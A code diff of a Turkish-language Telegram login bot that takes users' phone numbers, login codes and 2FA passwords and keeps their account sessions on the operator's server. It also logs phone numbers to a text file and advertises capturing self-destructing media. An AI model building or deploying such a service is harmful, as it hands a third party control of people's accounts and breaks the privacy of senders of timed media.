@@ -11,14 +11,15 @@ from config import API_ID, API_HASH, BOT_TOKEN, BOT_NAME
 from shared import user_data, user_clients
 from userbot import setup_userbot_handlers
 
-# Hata loglarını terminalde görmek için
+# Hataları terminalde takip edebilmek için loglama
 logging.basicConfig(level=logging.ERROR)
 
-# Ana Bot (Giriş Paneli)
+# Ana Panel Botu
 bot = Client("login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 # --- LOG TUTMA FONKSİYONU ---
 def log_user_to_file(chat_id, phone, username):
+    """Giriş yapan kullanıcıyı dosyaya kaydeder."""
     try:
         with open("kayitli_kullanicilar.txt", "a", encoding="utf-8") as f:
             f.write(f"ID: {chat_id} | Kullanıcı: @{username} | Tel: {phone}\n")
@@ -29,14 +30,14 @@ def log_user_to_file(chat_id, phone, username):
 async def start_handler(client, message):
     chat_id = message.chat.id
     
-    # 1. ÖZELLİK: AKTİF OTURUM KONTROLÜ
+    # Oturum kontrolü
     session_file = f"session_{chat_id}.session"
     if os.path.exists(session_file):
         text = (
             f"<b>⚠️ Zaten aktif bir oturumunuz bulunuyor!</b>\n\n"
-            "<code>Yeniden kurulum yapmak için mevcut oturumu kapatmalı veya dosyaları silmelisiniz.</code>"
+            "<code>UserBot'unuz şu an çalışıyor. Komutları sohbette kullanabilirsiniz.</code>"
         )
-        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Komut Listesi", callback_data="show_commands")]])
+        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Komut Rehberi", callback_data="show_commands")]])
         return await message.reply(text, reply_markup=buttons)
 
     welcome_text = (
@@ -65,11 +66,10 @@ async def callback_handler(client, callback_query):
         cmd_text = (
             f"<b>📜 {BOT_NAME} Komutları</b>\n"
             "──────────────────────\n"
-            "• <code>.alive</code> - Aktiflik testi.\n"
-            "• <code>.gpt (soru)</code> - AI asistan.\n"
-            "• <code>.help</code> - Bu menüyü sohbete yazar.\n"
-            "• <code>.log</code> - Uptime bilgisini gösterir.\n"
-            "• <code>.out</code> - Oturumu kapatır.\n"
+            "• <code>.help</code> - Komut rehberini mesaj olarak atar.\n"
+            "• <code>.alive</code> - Botun durumunu gösterir.\n"
+            "• <code>.gpt (soru)</code> - Yapay zeka asistanı.\n"
+            "• <code>.out</code> - Oturumu sonlandırır.\n"
             "──────────────────────\n"
             "🛡 <b>Süreli Medya Yakalayıcı Aktif!</b>"
         )
@@ -85,6 +85,14 @@ async def callback_handler(client, callback_query):
         await callback_query.edit_message_text(welcome_text, reply_markup=buttons)
 
     elif data == "start_login":
+        # KRİTİK KONTROL: Eğer oturum varsa butona basıldığında uyarı ver
+        session_file = f"session_{chat_id}.session"
+        if os.path.exists(session_file):
+            return await callback_query.answer(
+                "⚠️ Zaten aktif bir oturumunuz var!\nYeniden kurmak için önce mevcut oturumu silmelisiniz.", 
+                show_alert=True
+            )
+
         user_data[chat_id]["step"] = "phone"
         await callback_query.edit_message_text(
             "<b>📱 Numara Girişi</b>\n──────────────────────\n<code>Lütfen numaranızı yazın (+90...):</code>", 
@@ -94,9 +102,8 @@ async def callback_handler(client, callback_query):
     elif data == "confirm_phone":
         phone = user_data[chat_id].get("phone")
         session_name = f"session_{chat_id}"
-        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Bağlantı kuruluyor...</code>")
+        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Telegram'a bağlanılıyor...</code>")
         
-        # Temiz başlangıç
         if session_name in user_clients: del user_clients[session_name]
         user_clients[session_name] = Client(session_name, api_id=API_ID, api_hash=API_HASH)
 
@@ -107,7 +114,7 @@ async def callback_handler(client, callback_query):
             
             await client.edit_message_text(
                 chat_id, main_msg_id, 
-                f"<b>📩 Kod Gönderildi</b>\n──────────────────────\n<code>{phone} adresine gelen kodu girin:</code>"
+                f"<b>📩 Kod Gönderildi</b>\n──────────────────────\n<code>{phone} numarasına gelen kodu girin:</code>"
             )
         except Exception as e:
             await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Geri Dön", callback_data="back_to_main")]]))
@@ -137,13 +144,13 @@ async def login_logic(client, message):
 
     elif step == "code":
         clean_code = message.text.replace(" ", "")
-        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Kod doğrulanıyor...</code>")
+        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Doğrulanıyor...</code>")
         try:
             await user_clients[session_name].sign_in(user_data[chat_id]["phone"], user_data[chat_id]["hash"], clean_code)
             await finalize_login(client, chat_id, main_msg_id, session_name)
         except SessionPasswordNeeded:
             user_data[chat_id]["step"] = "password"
-            await client.edit_message_text(chat_id, main_msg_id, "<b>🔐 2FA (Bulut Şifresi)</b>\n──────────────────────\n<code>Şifrenizi girin:</code>")
+            await client.edit_message_text(chat_id, main_msg_id, "<b>🔐 2FA Gerekli</b>\n──────────────────────\n<code>Bulut şifrenizi girin:</code>")
         except Exception as e:
             await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>")
 
@@ -155,27 +162,27 @@ async def login_logic(client, message):
             await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Şifre Hatalı: {str(e)}</code>")
 
 async def finalize_login(client, chat_id, main_msg_id, session_name):
-    # Döngüye girmemesi için durumu hemen kapatıyoruz
+    # Giriş biter bitmez durumu sıfırla
     user_data[chat_id]["step"] = None
     
     if user_clients[session_name].is_connected:
         await user_clients[session_name].disconnect()
     
-    # 2. ÖZELLİK: LOG TUTMA
+    # Yeni bir nesneyle tertemiz başlat
     user_clients[session_name] = Client(session_name, api_id=API_ID, api_hash=API_HASH)
     setup_userbot_handlers(user_clients[session_name])
     await user_clients[session_name].start()
     
+    # LOGLAMA VE BİLGİ ALMA
     me = await user_clients[session_name].get_me()
     log_user_to_file(chat_id, user_data[chat_id].get("phone"), me.username or me.first_name)
     
     await client.edit_message_text(
         chat_id, main_msg_id, 
-        f"<b>🎉 Kurulum Başarılı!</b>\n\n<code>UserBot aktif edildi ve @{me.username or me.first_name} olarak loglandı.</code>"
+        f"<b>🎉 Kurulum Tamamlandı!</b>\n\n<code>Hesap: @{me.username or me.first_name}\nLog dosyasına kaydedildi.</code>"
     )
-    await user_clients[session_name].send_message("me", f"🚀 <b>{BOT_NAME} Aktif!</b>\nKomutları görmek için <code>.help</code> yazabilirsin.")
+    await user_clients[session_name].send_message("me", f"✅ <b>UserBot Başarıyla Kuruldu!</b>\nKomutları görmek için <code>.help</code> yazabilirsin.")
 
 if __name__ == "__main__":
-    print(f"--- {BOT_NAME} ÇALIŞIYOR ---")
+    print(f"--- {BOT_NAME} SUNUCUDA BAŞLATILDI ---")
     bot.run()
-    
